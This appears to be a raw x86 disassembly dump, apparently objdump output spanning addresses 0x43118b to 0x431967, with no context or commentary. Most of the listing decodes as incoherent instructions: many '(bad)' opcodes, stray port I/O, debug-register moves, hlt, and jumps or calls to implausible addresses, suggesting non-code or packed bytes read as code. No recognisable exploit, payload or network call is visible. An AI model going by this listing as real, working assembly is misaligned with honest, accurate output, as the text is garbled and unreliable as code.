  43118b:	mov    DWORD PTR [eax],0xb87e8b98
  431191:	test   ebx,eax
  431193:	jmp    DWORD PTR [edi-0x1]
  431196:	int    0xe9
  431198:	sub    esp,esi
  43119a:	add    eax,DWORD PTR [ebp-0x30]
  43119d:	fild   WORD PTR [ebp+0x3f]
  4311a0:	cmp    eax,edi
  4311a2:	je     0xcc43f7c4
  4311a8:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4311af:	(bad)  
  4311b0:	jne    0x43113e
  4311b2:	mov    ebx,ecx
  4311b4:	cld    
  4311b5:	jle    0x4311fc
  4311b7:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  4311bd:	inc    ebp
  4311be:	call   0xeb3b4e
  4311c3:	add    BYTE PTR [ebx-0x7f170301],cl
  4311c9:	add    DWORD PTR es:[eax],eax
  4311cc:	add    al,al
  4311ce:	xor    BYTE PTR [eax+0x41],dl
  4311d1:	inc    ebp
  4311d2:	add    BYTE PTR [ebx+0xfcd88b],cl
  4311d8:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  4311de:	add    DWORD PTR [ecx+0x458be845],ecx
  4311e4:	fmul   DWORD PTR [ebx+0x8bb800]
  4311ea:	cld    
  4311eb:	call   0xd83cb0
  4311f0:	dec    DWORD PTR [ebx+0x1090e8ff]
  4311f6:	add    al,al
  4311f8:	push   eax
  4311f9:	es inc ebp
  4311fb:	inc    ebp
  4311fc:	mov    ecx,DWORD PTR [ebx+0xd89c]
  431202:	dec    DWORD PTR [ebx-0x3ff70301]
  431208:	mov    DWORD PTR gs:[eax],eax
  43120b:	call   0x8b6b57d0
  431210:	inc    ebp
  431211:	mov    eax,0xe8d8008b
  431216:	add    BYTE PTR [ecx],ch
  431218:	mov    eax,DWORD PTR [eax]
  43121a:	cld    
  43121b:	mov    eax,eax
  43121d:	call   0x462b2277
  431222:	sub    DWORD PTR [ebx-0x3c743000],ecx
  431228:	cld    
  431229:	mov    BYTE PTR [eax+0x8401c1],0x1
  431230:	xor    BYTE PTR [eax],al
  431232:	push   edi
  431233:	inc    ebp
  431234:	mov    DWORD PTR [ebx],esi
  431236:	in     al,0xb9
  431238:	inc    ebp
  431239:	lea    ecx,[ebx-0x3c370301]
  43123f:	dec    ebp
  431240:	cdq    
  431241:	mov    esi,DWORD PTR [edx]
  431243:	or     BYTE PTR [ebx],al
  431245:	ror    DWORD PTR [ebp-0xfebf79],0x0
  43124c:	call   0x433b96
  431251:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  431257:	jge    0x43128c
  431259:	mov    eax,DWORD PTR [ebx]
  43125b:	cld    
  43125c:	lea    edx,[eax+0xff0120]
  431262:	call   0x433bf6
  431267:	push   eax
  431268:	inc    DWORD PTR [ebp-0x1c]
  43126b:	mov    ecx,DWORD PTR [ebp-0x58]
  43126e:	xor    eax,DWORD PTR [eax]
  431270:	add    edi,edi
  431272:	cmp    ebp,eax
  431274:	jne    0x43129c
  431276:	mov    DWORD PTR [eax],0x8b004dd8
  43127c:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  431283:	mov    eax,ebx
  431285:	cld    
  431286:	test   BYTE PTR [eax+0x320199],bh
  43128c:	mov    DWORD PTR [ebp+0x8],esi
  43128f:	xor    eax,DWORD PTR [ebp-0x73]
  431292:	test   DWORD PTR [esp+esi*2-0x1],edi
  431296:	mov    ebp,eax
  431298:	mov    eax,0x33004d29
  43129d:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  4312a3:	add    DWORD PTR [eax],eax
  4312a5:	add    BYTE PTR [ebp+0x30],al
  4312a8:	mov    edx,DWORD PTR [edi-0x48]
  4312ab:	add    ebx,0xffffffe4
  4312ae:	addr16 test ebp,ecx
  4312b1:	je     0x4312de
  4312b3:	mov    eax,DWORD PTR [ebx]
  4312b5:	cld    
  4312b6:	sar    BYTE PTR [eax+0x3b0145],1
  4312bc:	pcmpeqw mm4,mm6
  4312bf:	xor    edi,edi
  4312c1:	lea    ecx,[ebx-0x239c7470]
  4312c7:	add    BYTE PTR [ebp+0x50],cl
  4312ca:	cmp    eax,DWORD PTR [ebp+0x75]
  4312cd:	mov    ebp,DWORD PTR [eax-0x68]
  4312d0:	test   DWORD PTR [eax],eax
  4312d2:	clc    
  4312d3:	push   DWORD PTR [ebp-0x1]
  4312d6:	lea    ecx,[eax]
  4312d8:	int3   
  4312d9:	inc    ebp
  4312da:	call   0xfb436a
  4312df:	jne    0x4312d9
  4312e1:	xor    edi,DWORD PTR [ebp-0x41]
  4312e4:	jmp    0x431358
  4312e6:	mov    eax,DWORD PTR [eax]
  4312e8:	mov    eax,0x339545c7
  4312ed:	inc    DWORD PTR [ebx]
  4312ef:	push   DWORD PTR [ecx]
  4312f1:	aaa    
  4312f2:	mov    eax,DWORD PTR [eax]
  4312f4:	jmp    0x431346
  4312f6:	mov    eax,DWORD PTR [ebp-0x3c]
  4312f9:	mov    eax,eax
  4312fb:	cld    
  4312fc:	clc    
  4312fd:	ret    
  4312fe:	test   bh,al
  431300:	pop    es
  431301:	xchg   ebp,eax
  431302:	add    bh,bh
  431304:	inc    ebp
  431305:	dec    DWORD PTR [edi]
  431307:	and    DWORD PTR [ebx],ebp
  431309:	add    BYTE PTR [eax],al
  43130b:	push   eax
  43130c:	jbe    0x431363
  43130e:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  431314:	or     al,0xcf
  431316:	inc    eax
  431317:	enter  0x745,0x72
  43131b:	inc    ebp
  43131c:	mov    eax,DWORD PTR [ecx]
  43131e:	int3   
  43131f:	add    BYTE PTR [ebp-0x75],al
  431322:	ss mov eax,0x33c74d9c
  431328:	ror    BYTE PTR [ebp+0x72f80885],1
  43132e:	inc    ebp
  43132f:	add    BYTE PTR [ebx-0x3c7423bb],cl
  431335:	fadd   st,st(6)
  431337:	rol    BYTE PTR [ebp+0x12],0x8b
  43133b:	inc    ebp
  43133c:	fmul   QWORD PTR [ebx-0x3c39233d]
  431342:	inc    ebp
  431343:	test   bh,al
  431345:	cdq    
  431346:	clc    
  431347:	xor    al,BYTE PTR [ebp+0x45dcf889]
  43134d:	inc    ebp
  43134e:	cmp    BYTE PTR [ebx],dh
  431350:	pushf  
  431351:	mov    ecx,0xffb48dc7
  431356:	test   eax,ecx
  431358:	clc    
  431359:	dec    ebp
  43135a:	inc    ebp
  43135b:	mov    edi,DWORD PTR [edx]
  43135d:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  431364:	test   edi,edi
  431366:	clc    
  431367:	test   DWORD PTR [ebp+0x45],0x89c8b3c
  43136e:	(bad)  
  43136f:	enter  0x18e8,0x85
  431373:	ss clc 
  431375:	pushf  
  431376:	inc    ebp
  431377:	dec    DWORD PTR [ebx-0x3cba0f04]
  43137d:	push   eax
  43137e:	xabort 0x7d
  431381:	add    BYTE PTR [ebx],bh
  431383:	mov    ecx,DWORD PTR [edi]
  431385:	mov    DWORD PTR [eax],ebx
  431387:	les    eax,FWORD PTR [eax]
  431389:	adc    ebp,ecx
  43138b:	dec    ebp
  43138c:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  431392:	mov    ecx,esi
  431394:	lock or al,cl
  431397:	clc    
  431398:	inc    ebp
  431399:	add    esi,DWORD PTR [ebx]
  43139b:	jge    0x4313a0
  43139d:	xor    edi,DWORD PTR [ebx]
  43139f:	cmp    ecx,DWORD PTR [edi]
  4313a1:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4313a6:	mov    edi,DWORD PTR [ecx]
  4313a8:	test   al,0xcc
  4313aa:	dec    ebp
  4313ab:	test   BYTE PTR [ebx],dh
  4313ad:	pop    es
  4313ae:	xor    eax,DWORD PTR [eax]
  4313b0:	add    ecx,DWORD PTR [esi]
  4313b2:	add    ecx,eax
  4313b4:	psraw  mm0,mm1
  4313b7:	sub    BYTE PTR [ebp+0x38],cl
  4313ba:	mov    edi,DWORD PTR [ebx]
  4313bc:	lock int3 
  4313be:	shl    edx,1
  4313c0:	rol    BYTE PTR [ebp+0xc],1
  4313c3:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4313ca:	jmp    0x7c1414
  4313cf:	pushf  
  4313d0:	inc    ebp
  4313d1:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4313d7:	xor    ecx,ebx
  4313d9:	add    ecx,esi
  4313db:	mov    esi,eax
  4313dd:	enter  0x45af,0x8b
  4313e1:	xor    ecx,eax
  4313e3:	add    edx,DWORD PTR [ebp-0x77]
  4313e6:	sub    ecx,DWORD PTR [eax]
  4313e8:	cmp    eax,DWORD PTR [ebp+0x77]
  4313eb:	(bad)  
  4313ec:	mov    ebx,DWORD PTR [eax+ebp*4+0xa889c7]
  4313f3:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  4313f9:	cmp    esi,DWORD PTR [ebx]
  4313fb:	pushf  
  4313fc:	xor    eax,edi
  4313fe:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  431405:	inc    ebp
  431406:	dec    ebp
  431407:	cmp    eax,0xc7f09c8b
  43140c:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  431413:	inc    ebp
  431414:	jmp    0x431455
  431416:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43141d:	dec    ebp
  43141e:	xor    esi,DWORD PTR [ebx]
  431420:	add    eax,DWORD PTR [ebx]
  431422:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  431428:	dec    ebp
  431429:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  43142f:	out    dx,eax
  431430:	rol    BYTE PTR [eax],1
  431432:	add    eax,0xebc8458b
  431437:	dec    ebp
  431438:	mov    ebp,DWORD PTR [ebx]
  43143a:	mov    esp,0x33f84d8b
  43143f:	ret    
  431440:	xor    eax,esi
  431442:	add    ecx,eax
  431444:	add    eax,DWORD PTR [edx+0xc1010f]
  43144a:	dec    ebp
  43144b:	inc    ebp
  43144c:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  431452:	ror    bl,1
  431454:	add    eax,0xebc645ce
  431459:	scas   eax,DWORD PTR es:[edi]
  43145a:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  431460:	xor    ebp,DWORD PTR [ebx]
  431462:	xor    edi,DWORD PTR [ebx]
  431464:	add    esi,DWORD PTR [edi+0x3]
  431467:	mov    ecx,DWORD PTR [edi]
  431469:	clc    
  43146a:	rol    ebx,0x4d
  43146d:	(bad)  
  43146e:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  431475:	mov    ah,0x45
  431477:	dec    ebp
  431478:	jbe    0x4314ad
  43147a:	mov    esi,DWORD PTR [ebx]
  43147c:	call   0x33466184
  431481:	rdpmc  
  431483:	rol    DWORD PTR [ebx],0x4d
  431486:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  43148c:	inc    ebp
  43148d:	ror    BYTE PTR [ebx+0x45450808],1
  431493:	jmp    0x10b1523
  431498:	inc    ebp
  431499:	inc    ebp
  43149a:	(bad)  
  43149b:	mov    ebx,eax
  43149d:	clc    
  43149e:	test   ebx,eax
  4314a0:	clc    
  4314a1:	retf   
  4314a2:	inc    ebp
  4314a3:	into   
  4314a4:	mov    esi,0x8b85afec
  4314aa:	clc    
  4314ab:	enter  0x5545,0x38
  4314af:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4314b6:	ret    
  4314b7:	mov    ah,0xc6
  4314b9:	addr16 push 0x338b4545
  4314bf:	clc    
  4314c0:	add    eax,ebx
  4314c2:	loopne 0x43148f
  4314c4:	dec    ebp
  4314c5:	into   
  4314c6:	mov    al,dh
  4314c8:	or     BYTE PTR [edi-0x37ff748e],ch
  4314ce:	inc    ebp
  4314cf:	push   ebp
  4314d0:	mov    ebp,DWORD PTR [ebx]
  4314d2:	in     al,dx
  4314d3:	cmp    eax,ebx
  4314d5:	ja     0x43151c
  4314d7:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  4314dd:	inc    ebp
  4314de:	cdq    
  4314df:	mov    esi,DWORD PTR [edx]
  4314e1:	clc    
  4314e2:	mov    bl,al
  4314e4:	xlat   BYTE PTR ds:[ebx]
  4314e5:	retf   
  4314e6:	inc    ebp
  4314e7:	into   
  4314e8:	mov    eax,esi
  4314ea:	in     al,dx
  4314eb:	scas   eax,DWORD PTR es:[edi]
  4314ec:	retf   
  4314ed:	mov    ecx,DWORD PTR [ebp-0x38]
  4314f0:	mov    edx,DWORD PTR [ebp-0x24]
  4314f3:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8867]
  4314fa:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  431501:	mov    eax,DWORD PTR [ebx]
  431503:	clc    
  431504:	loopne 0x4314c9
  431506:	push   ebp
  431507:	retf   
  431508:	mov    dh,al
  43150a:	adc    esi,ecx
  43150c:	jb     0x4314bd
  43150e:	add    BYTE PTR [ebx+0x558bc845],cl
  431514:	in     al,dx
  431515:	sub    eax,ebx
  431517:	cmp    ecx,ebx
  431519:	mov    eax,esi
  43151b:	mov    esp,0x45af03ce
  431520:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  431526:	mov    eax,ebx
  431528:	in     al,dx
  431529:	into   
  43152a:	dec    ebp
  43152b:	(bad)  
  43152c:	xor    ebp,DWORD PTR [edi+0x80f8903]
  431532:	rol    DWORD PTR [ebp+0x4d],0x89
  431536:	xor    esp,esp
  431538:	sub    eax,DWORD PTR [ebp-0x75]
  43153b:	add    ebp,esp
  43153d:	mov    al,0x55
  43153f:	inc    ebp
  431540:	xor    esi,DWORD PTR [esi]
  431542:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  431549:	inc    ebp
  43154a:	xor    edi,DWORD PTR [ecx]
  43154c:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  431553:	test   DWORD PTR [eax],eax
  431555:	clc    
  431556:	enter  0x8645,0x33
  43155a:	inc    DWORD PTR [ebx]
  43155c:	(bad)  
  43155d:	jmp    0x4315a4
  43155f:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  431565:	inc    ebp
  431566:	(bad)  
  431567:	mov    ebp,DWORD PTR [edi-0x277b7424]
  43156d:	cdq    
  43156e:	retf   
  43156f:	xor    al,cl
  431571:	mov    BYTE PTR [ebp+0xb],cl
  431574:	lea    eax,[ebp+0x8]
  431577:	xor    esi,DWORD PTR [edx+0x3]
  43157a:	add    al,ah
  43157c:	inc    ebp
  43157d:	dec    ebp
  43157e:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  431584:	addr16 add ch,cl
  431587:	inc    ebp
  431588:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  43158e:	inc    ebp
  43158f:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  431595:	push   ebp
  431596:	(bad)  
  431597:	mov    BYTE PTR [edi+0xf723b11],ch
  43159d:	add    ch,ch
  43159f:	inc    ebp
  4315a0:	dec    DWORD PTR [ebx-0x34332775]
  4315a6:	add    al,0x4d
  4315a8:	inc    ebp
  4315a9:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4315af:	cdq    
  4315b0:	add    DWORD PTR [edx],esi
  4315b2:	add    BYTE PTR [ebx+0x4d00c000],cl
  4315b8:	push   DWORD PTR [ebx]
  4315ba:	int3   
  4315bb:	xor    eax,DWORD PTR [eax]
  4315bd:	add    edx,DWORD PTR [eax+0x3]
  4315c0:	mov    DWORD PTR [edi],ecx
  4315c2:	call   0x4288d688
  4315c7:	mov    DWORD PTR [ebp-0x20],esp
  4315ca:	add    BYTE PTR [ebp+0x7d],al
  4315cd:	mov    eax,DWORD PTR [eax]
  4315cf:	in     al,0x15
  4315d1:	ret    
  4315d2:	iret   
  4315d3:	(bad)  
  4315d4:	enter  0x14af,0x8b
  4315d8:	(bad)  
  4315d9:	in     al,dx
  4315da:	or     bl,cl
  4315dc:	adc    cl,al
  4315de:	push   ebp
  4315df:	dec    ebp
  4315e0:	inc    eax
  4315e1:	mov    edx,DWORD PTR [ebp-0x20]
  4315e4:	jb     0x4315b1
  4315e6:	mov    ecx,esi
  4315e8:	cld    
  4315e9:	scas   eax,DWORD PTR es:[edi]
  4315ea:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  4315f1:	mov    BYTE PTR [eax],0x8c
  4315f4:	push   0xffffff99
  4315f6:	push   edi
  4315f7:	xor    dl,BYTE PTR [eax+0x3b]
  4315fa:	mov    ecx,DWORD PTR [edi]
  4315fc:	call   0x8c425b5f
  431601:	mov    eax,eax
  431603:	in     al,dx
  431604:	jge    0x431653
  431606:	mov    DWORD PTR [ebx],esi
  431608:	int3   
  431609:	add    eax,DWORD PTR [ebp+0xf]
  43160c:	xor    eax,ecx
  43160e:	(bad)  
  43160f:	dec    ebp
  431610:	pushf  
  431611:	xor    ecx,esi
  431613:	add    edi,DWORD PTR [edi]
  431615:	mov    eax,DWORD PTR [ebp-0x38]
  431618:	(bad)  
  431619:	test   dh,dl
  43161b:	cdq    
  43161c:	add    esi,DWORD PTR [edx]
  43161e:	jmp    0x4315a9
  431620:	mov    cl,al
  431622:	add    eax,0x14330f45
  431627:	mov    ecx,0xff448d80
  43162c:	jmp    0xc99025f9
  431631:	mov    edx,ecx
  431633:	rol    BYTE PTR [ebp+0x330155],1
  431639:	add    ecx,DWORD PTR [ebp+0xf]
  43163c:	xor    eax,edx
  43163e:	(bad)  
  43163f:	ror    DWORD PTR [eax],0x86
  431642:	jb     0x431641
  431644:	add    bh,bh
  431646:	clc    
  431647:	inc    ebp
  431648:	jb     0x4316b4
  43164a:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  431650:	mov    ebx,DWORD PTR ss:[eax+ebx*8+0x68c000c7]
  431658:	ret    
  431659:	xor    al,bh
  43165b:	add    BYTE PTR [ebp+0x75],al
  43165e:	ss push 0xffffff9c
  431661:	inc    edi
  431663:	adc    al,0xe8
  431665:	inc    ebp
  431666:	test   DWORD PTR [ebp-0x7cba8b08],eax
  43166c:	mov    ecx,DWORD PTR [eax]
  43166e:	cld    
  43166f:	or     DWORD PTR [ebp-0x34],0x33
  431673:	jbe    0x431678
  431675:	mov    edx,DWORD PTR [ecx+0x2b]
  431678:	dec    ebp
  431679:	mov    cl,BYTE PTR [ebx+0x45d801]
  43167f:	mov    BYTE PTR [ebx],dh
  431681:	mov    eax,DWORD PTR [ebx]
  431683:	or     BYTE PTR [ecx+0x3b],dl
  431686:	dec    ebp
  431687:	int3   
  431688:	xor    ebp,edi
  43168a:	add    eax,DWORD PTR [ebp+0x51]
  43168d:	mov    ecx,DWORD PTR [ebp-0x28]
  431690:	xor    eax,DWORD PTR [eax]
  431692:	add    ebp,DWORD PTR [eax+0x51]
  431695:	adc    BYTE PTR [eax+0x0],0x8b
  431699:	add    BYTE PTR [ebx+0x4d18fcff],cl
  43169f:	inc    ebp
  4316a0:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4316a6:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4316ac:	dec    ebp
  4316ad:	mov    esi,DWORD PTR [ebx]
  4316af:	hlt    
  4316b0:	add    eax,ebx
  4316b2:	push   ecx
  4316b3:	inc    ebp
  4316b4:	dec    ebp
  4316b5:	(bad)  
  4316b6:	call   esi
  4316b8:	in     al,0xc7
  4316ba:	retf   
  4316bb:	mov    al,ds:0xc1ff39ce
  4316c0:	adc    al,0xc6
  4316c2:	inc    ebp
  4316c3:	and    eax,0x9c0f4c85
  4316c8:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4316cf:	cmp    BYTE PTR [ebx+0x3a],0x0
  4316d3:	mov    dh,0xc7
  4316d5:	cmp    eax,eax
  4316d7:	jne    0x45440f23
  4316dd:	mov    edi,DWORD PTR [eax]
  4316df:	mov    eax,0x848bcb9c
  4316e4:	rcr    BYTE PTR [ecx-0x7c7fcd0f],0x67
  4316eb:	or     BYTE PTR [edi],cl
  4316ed:	(bad)  
  4316ee:	dec    ebp
  4316ef:	inc    edi
  4316f0:	add    bh,0x51
  4316f3:	or     cl,ch
  4316f5:	test   DWORD PTR [eax+0x4d4501f8],ecx
  4316fb:	xchg   DWORD PTR [eax-0x1638ae64],eax
  431701:	mov    esp,0xf802b588
  431706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431707:	inc    ebp
  431708:	(bad)  
  431709:	cmp    bh,bh
  43170b:	pushf  
  43170c:	or     DWORD PTR [ecx+0x45ffe474],0x0
  431713:	mov    ecx,DWORD PTR [ebp-0x340018]
  431719:	into   
  43171a:	dec    DWORD PTR [ebx-0x7f72431c]
  431720:	push   0x5000ff01
  431725:	retf   
  431726:	inc    ebp
  431727:	into   
  431728:	dec    DWORD PTR [ebx-0x343f3ff4]
  43172e:	push   eax
  43172f:	into   
  431730:	call   0x4b1bc0
  431735:	retf   
  431736:	add    dh,cl
  431738:	add    bh,bh
  43173a:	mov    DWORD PTR [eax+ecx*1],edx
  43173d:	clc    
  43173e:	inc    ebp
  43173f:	inc    ebp
  431740:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  431746:	push   0x1
  431748:	push   edi
  431749:	add    BYTE PTR [eax-0x35],dl
  43174c:	mov    ecx,esi
  43174e:	cld    
  43174f:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  431755:	into   
  431756:	ror    BYTE PTR [ebx+0x75000800],0x50
  43175d:	xor    eax,DWORD PTR [ebp+0x3]
  431760:	jne    0x4317b3
  431762:	call   DWORD PTR [eax-0x3c]
  431765:	mov    DWORD PTR [ecx-0x18],edx
  431768:	mov    edi,edi
  43176a:	call   0x8b465cf3
  43176f:	add    ah,ah
  431771:	rol    BYTE PTR [ebp-0x7c],0xeb
  431775:	add    edi,edi
  431777:	add    al,ch
  431779:	inc    ebp
  43177a:	push   ecx
  43177b:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  431781:	mov    al,0xc7
  431783:	test   esp,esp
  431785:	clc    
  431786:	test   DWORD PTR [ebp-0x8],ecx
  431789:	add    BYTE PTR [ebp+0x51],0x39
  43178d:	jmp    0x8bcca02e
  431792:	in     al,dx
  431793:	or     BYTE PTR [ebp-0xf],al
  431796:	xor    eax,DWORD PTR [eax+0x4f896703]
  43179c:	hlt    
  43179d:	mov    eax,DWORD PTR [ebp-0x50]
  4317a0:	xor    esi,ecx
  4317a2:	add    eax,DWORD PTR [eax+0x4f086789]
  4317a8:	inc    ebp
  4317a9:	adc    esi,0x68
  4317ac:	pushf  
  4317ad:	inc    edi
  4317af:	add    al,ch
  4317b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4317b2:	test   edi,edi
  4317b4:	clc    
  4317b5:	inc    DWORD PTR [ebp-0x73]
  4317b8:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  4317bc:	(bad)  
  4317bd:	push   ecx
  4317be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4317bf:	jne    0x431746
  4317c1:	push   eax
  4317c2:	clc    
  4317c3:	test   DWORD PTR [ebp-0x1],eax
  4317c6:	cmp    eax,0xc78b9cff
  4317cb:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  4317d2:	inc    ebp
  4317d3:	push   edi
  4317d4:	aas    
  4317d5:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  4317dc:	dec    ebp
  4317dd:	add    BYTE PTR [ebx],dh
  4317df:	inc    ebp
  4317e0:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  4317e6:	enter  0x8401,0x0
  4317ea:	add    al,BYTE PTR [eax]
  4317ec:	add    bh,bh
  4317ee:	out    dx,eax
  4317ef:	sbb    BYTE PTR [eax],al
  4317f1:	dec    ebp
  4317f2:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  4317f8:	sub    esi,DWORD PTR [ebx]
  4317fa:	mov    ebp,DWORD PTR [eax-0x8]
  4317fd:	add    bl,0x0
  431800:	(bad)  
  431801:	cmp    eax,ecx
  431803:	or     BYTE PTR [edx+0x750114],al
  431809:	inc    DWORD PTR [ebp+0x18]
  43180c:	mov    eax,DWORD PTR [ebp-0x8]
  43180f:	mov    ebx,eax
  431811:	(bad)  
  431812:	retf   
  431813:	inc    ebp
  431814:	into   
  431815:	mov    esi,eax
  431817:	int3   
  431818:	scas   eax,DWORD PTR es:[edi]
  431819:	push   es
  43181a:	mov    esi,DWORD PTR [ebp-0xc]
  43181d:	call   DWORD PTR [ebp+0x18]
  431820:	sub    edi,DWORD PTR [ebp+0x3b]
  431823:	mov    esi,DWORD PTR [edi-0x34]
  431826:	mov    eax,DWORD PTR [ebp-0x8]
  431829:	ss ret 
  43182b:	pushf  
  43182c:	mov    bh,0xbc
  43182f:	fadd   QWORD PTR [eax]
  431831:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  431837:	mov    esi,DWORD PTR [ebx]
  431839:	in     al,0x33
  43183b:	ret    
  43183c:	add    eax,esi
  43183e:	add    eax,DWORD PTR [ebp+0xf]
  431841:	mov    eax,ecx
  431843:	in     al,0x4d
  431845:	ret    
  431846:	mov    eax,esi
  431848:	in     al,dx
  431849:	inc    ebp
  43184a:	rol    edi,1
  43184c:	sar    al,1
  43184e:	or     BYTE PTR [ebp+0x45e9f845],al
  431854:	add    BYTE PTR [eax],bh
  431856:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  43185d:	test   ebx,eax
  43185f:	clc    
  431860:	retf   
  431861:	inc    ebp
  431862:	into   
  431863:	cmp    al,dh
  431865:	pushf  
  431866:	scas   eax,DWORD PTR es:[edi]
  431867:	(bad)  
  431868:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  43186f:	inc    ebp
  431870:	cmp    edi,DWORD PTR [edi+esi*2]
  431873:	pushf  
  431874:	mov    eax,edi
  431876:	mov    esp,0x458567a8
  43187b:	clc    
  43187c:	mov    eax,DWORD PTR [ebp-0x8]
  43187f:	mov    eax,ebx
  431881:	in     al,dx
  431882:	retf   
  431883:	ret    
  431884:	into   
  431885:	mov    dh,0x7d
  431888:	scas   eax,DWORD PTR es:[edi]
  431889:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  43188f:	add    BYTE PTR [ebx],ch
  431891:	jmp    0xba19d1
  431896:	mov    eax,DWORD PTR [ebp-0x5c]
  431899:	mov    eax,DWORD PTR [ebp-0x14]
  43189c:	inc    ebp
  43189d:	enter  0x458b,0xf8
  4318a1:	xor    eax,ebx
  4318a3:	add    ecx,ebx
  4318a5:	cmp    ecx,esi
  4318a7:	shufps xmm7,xmm4,0xaf
  4318ab:	add    BYTE PTR [ebx+0x55e8f48b],cl
  4318b1:	dec    ebp
  4318b2:	sub    esi,DWORD PTR [ebx]
  4318b4:	cmp    esi,DWORD PTR [ebx]
  4318b6:	ja     0x4318bb
  4318b8:	mov    eax,DWORD PTR [ebx]
  4318ba:	lods   al,BYTE PTR ds:[esi]
  4318bb:	mov    db0,ecx
  4318be:	inc    ebp
  4318bf:	dec    ebp
  4318c0:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  4318c6:	retf   
  4318c7:	rol    dh,1
  4318c9:	or     al,0xce
  4318cb:	inc    ebp
  4318cc:	scas   eax,DWORD PTR es:[edi]
  4318cd:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  4318d3:	add    BYTE PTR [ebx],ch
  4318d5:	add    BYTE PTR [ebx],bh
  4318d7:	inc    ebp
  4318d8:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  4318de:	inc    ebp
  4318df:	retf   
  4318e0:	mov    ecx,esi
  4318e2:	clc    
  4318e3:	(bad)  
  4318e4:	retf   
  4318e5:	scas   eax,DWORD PTR es:[edi]
  4318e6:	ret    
  4318e7:	mov    ecx,esi
  4318e9:	hlt    
  4318ea:	(bad)  
  4318eb:	push   ebp
  4318ec:	scas   eax,DWORD PTR es:[edi]
  4318ed:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  4318f3:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  4318f9:	add    BYTE PTR [ebx],al
  4318fb:	mov    eax,eax
  4318fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4318fe:	inc    ebp
  4318ff:	dec    ebp
  431900:	xor    ebx,DWORD PTR ss:[ebx+esi*1+0x3d00389]
  431908:	inc    ebp
  431909:	(bad)  
  43190b:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  431913:	sar    eax,1
  431915:	rol    BYTE PTR [ebp+0x5],1
  431918:	xor    eax,DWORD PTR [ebp+0x3]
  43191b:	jmp    0x431908
  43191d:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  431923:	xor    eax,DWORD PTR [ebp+0x33]
  431926:	mov    eax,DWORD PTR [ebx]
  431928:	rol    BYTE PTR [ebx],1
  43192a:	test   BYTE PTR [edi],cl
  43192c:	cdq    
  43192d:	shl    DWORD PTR [edx],0x4d
  431930:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  431936:	xor    edx,eax
  431938:	add    eax,DWORD PTR ds:0xeb4d45e0
  43193e:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  431944:	add    BYTE PTR [ebx],dh
  431946:	inc    ebp
  431947:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  43194d:	rdpmc  
  43194f:	rol    DWORD PTR [ebx],0x4d
  431952:	loopne 0x4318df
  431954:	push   ebp
  431955:	in     al,dx
  431956:	mov    cl,dl
  431958:	adc    eax,edx
  43195a:	jb     0x431961
  43195c:	add    BYTE PTR [ebp+0x45],al
  43195f:	jmp    0x4318ec
  431961:	mov    ebx,eax
  431963:	test   al,0xcb
  431965:	dec    ebp
  431966:	dec    ebp
  431967:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
